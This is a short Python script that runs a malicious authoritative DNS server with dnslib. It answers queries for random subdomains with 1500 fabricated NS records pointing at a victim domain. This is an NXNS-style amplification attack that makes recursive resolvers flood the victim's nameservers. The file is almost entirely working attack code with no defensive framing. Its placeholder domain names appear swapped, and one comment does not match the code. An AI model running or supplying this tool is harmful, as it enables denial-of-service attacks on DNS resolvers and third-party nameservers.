from dnslib import DNSHeader, RR, A, NS, QTYPE, DNSLabel
from dnslib.server import DNSServer, DNSLogger
import random
import string

ATTACKER_DOMAIN = "example.com"
VICTIM_DOMAIN = "attacker.com"
MY_IP = "0.0.0.0"
NS_NAME = "ns1." + ATTACKER_DOMAIN
NUMS_NS = 1500

class MaliciousResolver:
    def generate_random_string(self, length=8):
        return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        qtype = request.q.qtype

        # Role 1: Handle NS queries for the primary domain
        if qname == DNSLabel(ATTACKER_DOMAIN) and qtype == QTYPE.NS:
            print(f"[+] Handling legit NS query for {qname}")
            reply.add_answer(RR(ATTACKER_DOMAIN, QTYPE.NS, rdata=NS(NS_NAME)))
            reply.add_ar(RR(NS_NAME, QTYPE.A, rdata=A(MY_IP)))
            return reply

        # Role 2: Handle A queries for random subdomains
        elif qname.matchSuffix(DNSLabel(ATTACKER_DOMAIN)) and qtype == QTYPE.A:
            print(f"[!] Handling attack query for {qname}, generating malicious NS list...")
            # Dynamically generate a large number of unique, non-existent NS records
            for _ in range(NUMS_NS):  # 1500x amplification
                fake_subdomain = self.generate_random_string()
                fake_ns_name = f"{fake_subdomain}.{VICTIM_DOMAIN}"
                reply.add_auth(RR(qname, QTYPE.NS, rdata=NS(fake_ns_name)))
            return reply

        # For other queries, simply return REFUSED
        return request.reply()


# Setup and start DNS server
logger = DNSLogger(prefix=False)
resolver = MaliciousResolver()
server = DNSServer(resolver, port=53, address=MY_IP, logger=logger)

print(f"[*] Starting Malicious DNS Server for {ATTACKER_DOMAIN} on {MY_IP}...")
server.start()